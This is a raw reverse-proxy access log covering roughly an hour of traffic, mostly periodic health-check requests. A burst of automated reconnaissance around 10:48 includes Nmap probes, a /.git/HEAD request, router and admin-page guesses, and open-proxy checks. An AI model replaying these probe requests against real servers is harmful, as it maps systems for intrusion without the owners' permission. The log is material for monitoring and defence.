167.71.120.76 - - [14/Dec/2023:10:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1592 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1593 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1594 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1595 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1596 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1597 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1598 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1599 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1600 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1601 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1602 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1603 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1604 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:10:21:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1605 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:10:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1606 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1607 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1608 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1609 "www@docker" "http://172.25.0.8:80" 0ms
90.151.171.108 - - [14/Dec/2023:10:24:18 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1610 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:10:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1611 "www@docker" "http://172.25.0.8:80" 0ms
90.151.171.108 - - [14/Dec/2023:10:24:33 +0000] "GET /ip.php?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1612 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:10:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1613 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1614 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1615 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1616 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1617 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1618 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1619 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1620 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1621 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1622 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1623 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1624 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1625 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1626 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1627 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1628 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1629 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1630 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1631 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1632 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1633 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1634 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1635 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1636 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1637 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1638 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1639 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1640 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1641 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1642 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1643 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1644 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1645 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1646 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1647 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1648 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1649 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1650 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1651 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1652 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1653 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1654 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1655 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1656 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1657 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1658 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1659 "www@docker" "http://172.25.0.8:80" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:23 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1660 "-" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1661 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /Portal0000.htm HTTP/1.1" 301 17 "-" "-" 1662 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /.git/HEAD HTTP/1.1" 301 17 "-" "-" 1663 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1667 "-" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /ppE7 HTTP/1.1" 301 17 "-" "-" 1665 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /CSS/Miniweb.css HTTP/1.1" 301 17 "-" "-" 1664 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "POST /sdk HTTP/1.1" 308 18 "-" "-" 1666 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 301 17 "-" "-" 1668 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "POST /scripts/WPnBr.dll HTTP/1.1" 308 18 "-" "-" 1669 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /Portal/Portal.mwsl HTTP/1.1" 301 17 "-" "-" 1670 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1672 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /nmaplowercheck1702550905 HTTP/1.1" 301 17 "-" "-" 1671 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /main.cfm HTTP/1.1" 301 17 "-" "-" 1673 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1674 "www@docker" "http://172.25.0.8:80" 1ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /__Additional HTTP/1.1" 301 17 "-" "-" 1675 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "HEAD / HTTP/1.1" 308 18 "-" "-" 1676 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 301 17 "-" "-" 1677 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /docs/cplugError.html/ HTTP/1.1" 301 17 "-" "-" 1678 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /HNAP1 HTTP/1.1" 301 17 "-" "-" 1679 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /localstart.shtml HTTP/1.1" 301 17 "-" "-" 1680 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /pools/default/buckets HTTP/1.1" 301 17 "-" "-" 1681 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /pools HTTP/1.1" 301 17 "-" "-" 1682 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET /menu.shtml HTTP/1.1" 301 17 "-" "-" 1683 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1684 "-" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1685 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:25 +0000] "GET /start.jsa HTTP/1.1" 301 17 "-" "-" 1686 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:25 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 1687 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:25 +0000] "GET /main.jsa HTTP/1.1" 301 17 "-" "-" 1688 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:25 +0000] "GET /localstart.jsa HTTP/1.1" 301 17 "-" "-" 1689 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:26 +0000] "GET /start.pl HTTP/1.1" 301 17 "-" "-" 1690 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:26 +0000] "GET /start.jhtml HTTP/1.1" 301 17 "-" "-" 1691 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:26 +0000] "GET /home.cfm HTTP/1.1" 301 17 "-" "-" 1692 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:26 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 1693 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:27 +0000] "GET /readme.txt HTTP/1.1" 301 17 "-" "-" 1694 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:27 +0000] "GET /admin.shtml HTTP/1.1" 301 17 "-" "-" 1695 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:27 +0000] "GET /base.cgi HTTP/1.1" 301 17 "-" "-" 1696 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:27 +0000] "GET /default.jsa HTTP/1.1" 301 17 "-" "-" 1697 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:27 +0000] "GET /admin.php HTTP/1.1" 301 17 "-" "-" 1698 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:28 +0000] "GET /menu.cgi HTTP/1.1" 301 17 "-" "-" 1699 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:28 +0000] "GET /admin.jsp HTTP/1.1" 301 17 "-" "-" 1700 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:28 +0000] "GET /menu.jhtml HTTP/1.1" 301 17 "-" "-" 1701 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:28 +0000] "GET /localstart.cgi HTTP/1.1" 301 17 "-" "-" 1702 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:29 +0000] "GET /default.aspx HTTP/1.1" 301 17 "-" "-" 1703 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:29 +0000] "GET /admin.jsa HTTP/1.1" 301 17 "-" "-" 1704 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:29 +0000] "GET /start.cgi HTTP/1.1" 301 17 "-" "-" 1705 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:30 +0000] "GET /main.cgi HTTP/1.1" 301 17 "-" "-" 1706 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:30 +0000] "GET /main.shtml HTTP/1.1" 301 17 "-" "-" 1707 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:30 +0000] "GET /start.aspx HTTP/1.1" 301 17 "-" "-" 1708 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:30 +0000] "GET /home.cgi HTTP/1.1" 301 17 "-" "-" 1709 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:30 +0000] "GET /admin.cgi HTTP/1.1" 301 17 "-" "-" 1710 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:31 +0000] "GET /default.html HTTP/1.1" 301 17 "-" "-" 1711 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:31 +0000] "GET /admin.cfm HTTP/1.1" 301 17 "-" "-" 1712 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:31 +0000] "GET /admin.aspx HTTP/1.1" 301 17 "-" "-" 1713 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:32 +0000] "GET /start.asp HTTP/1.1" 301 17 "-" "-" 1714 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:32 +0000] "GET /index.jhtml HTTP/1.1" 301 17 "-" "-" 1715 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:32 +0000] "GET /admin.asp HTTP/1.1" 301 17 "-" "-" 1716 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:33 +0000] "GET /main.aspx HTTP/1.1" 301 17 "-" "-" 1717 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:33 +0000] "GET /base.shtml HTTP/1.1" 301 17 "-" "-" 1718 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:33 +0000] "GET /base.pl HTTP/1.1" 301 17 "-" "-" 1719 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:33 +0000] "GET /index.jsa HTTP/1.1" 301 17 "-" "-" 1720 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:34 +0000] "GET /base.php HTTP/1.1" 301 17 "-" "-" 1721 "web-to-websecure@internal" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:34 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1722 "-" "-" 0ms
139.144.52.241 - - [14/Dec/2023:10:48:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1723 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:10:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1724 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1725 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1726 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1727 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1728 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1729 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1730 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1731 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1732 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1733 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1734 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1735 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1736 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:10:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1737 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1738 "www@docker" "http://172.25.0.8:80" 1ms
45.155.126.211 - - [14/Dec/2023:10:55:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1739 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:10:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1740 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1741 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1742 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:10:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1743 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1744 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1745 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:10:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1746 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:10:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1747 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1748 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1749 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1750 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1751 "www@docker" "http://172.25.0.8:80" 1ms
35.203.210.115 - - [14/Dec/2023:11:02:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1752 "web-to-websecure@internal" "-" 0ms
35.203.210.115 - - [14/Dec/2023:11:02:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1753 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1754 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1755 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1756 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1757 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1758 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1759 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1760 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1761 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1762 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1763 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1764 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1765 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:11:08:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1766 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1767 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1768 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1769 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1770 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1771 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1772 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1773 "www@docker" "http://172.25.0.8:80" 0ms
